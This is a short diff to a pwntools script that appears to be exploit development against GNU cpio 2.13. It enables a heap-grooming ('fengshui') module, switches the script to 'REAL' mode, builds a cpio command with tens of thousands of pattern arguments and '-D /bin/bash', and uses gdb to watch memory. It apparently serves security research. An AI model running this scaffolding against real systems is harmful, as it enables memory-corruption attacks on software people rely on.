@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 
 from pwn import *
-# import fengshui
+import fengshui
 
-REAL = 0
+REAL = 1
 
 PATTERN_FILE = "./patt"
 CPIO_BINARY = "./cpio-2.13/src/cpio"
@@ -12,7 +12,7 @@ if REAL:
 BLOCK_SIZE = 16384 # 1<<20
 NUM_PATTERNS = 0xc200
 
-cpio_cmd = f"{CPIO_BINARY} -iv -E {PATTERN_FILE}" + " y"*NUM_PATTERNS # -D {PATTERN_FILE}"
+cpio_cmd = f"{CPIO_BINARY} -iv -E {PATTERN_FILE} -D /bin/bash" + " y"*NUM_PATTERNS
 
 # open a gdb session
 gdb_cmd = f"gdb --args"
@@ -44,14 +44,8 @@ if not REAL:
     p.sendline(b'define hook-continue')
     p.sendline(b'vmmap')
     p.sendline(b'end')
-    # out = p.recvuntil("New pattern")
-    # print(out.decode(), end='')
-    # print(p.recv().decode())
-    # p.interactive()
-    # p.close()
-    # exit()
     p.sendline(b'r')
     p.sendline(b'c')
-    # p.sendline(b'c')
+    p.sendline(b'c')
     # p.sendline(b'vmmap')
 p.interactive()
